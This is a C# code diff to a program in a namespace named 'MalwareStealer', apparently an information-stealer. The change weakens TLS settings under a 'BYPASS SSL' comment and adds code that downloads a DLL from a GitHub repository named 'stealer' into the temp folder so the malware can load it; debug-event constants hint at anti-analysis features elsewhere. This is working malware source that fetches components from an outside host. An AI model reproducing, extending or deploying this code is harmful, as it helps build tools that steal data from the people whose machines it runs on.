@@ -103,10 +103,9 @@ namespace MalwareStealer
         const int EXCEPTION_DEBUG_EVENT = 1;
         const uint EXCEPTION_SINGLE_STEP = 0x80000004;
 
-        // ===== EMBED DLL RESOLVER (BYPASS SSL) =====
+        // ===== EMBED DLL RESOLVER (BYPASS SSL + e_sqlite3) =====
         static void SetupDLLResolver()
         {
-            // BYPASS SSL/TLS ERROR
             try
             {
                 ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;
@@ -116,6 +115,26 @@ namespace MalwareStealer
             catch (Exception ex)
             {
                 Console.WriteLine("[-] Failed to bypass SSL: " + ex.Message);
+            }
+
+            // Download e_sqlite3.dll
+            string eSqlitePath = Path.Combine(Path.GetTempPath(), "e_sqlite3.dll");
+            if (!File.Exists(eSqlitePath))
+            {
+                try
+                {
+                    Console.WriteLine("[+] Downloading e_sqlite3.dll from GitHub...");
+                    using (var client = new WebClient())
+                    {
+                        client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
+                        client.DownloadFile("https://raw.githubusercontent.com/dailam008/stealer/main/e_sqlite3.dll", eSqlitePath);
+                    }
+                    Console.WriteLine("[+] Download complete: " + eSqlitePath);
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine("[-] Failed to download e_sqlite3.dll: " + ex.Message);
+                }
             }
 
             AppDomain.CurrentDomain.AssemblyResolve += (sender, args) =>
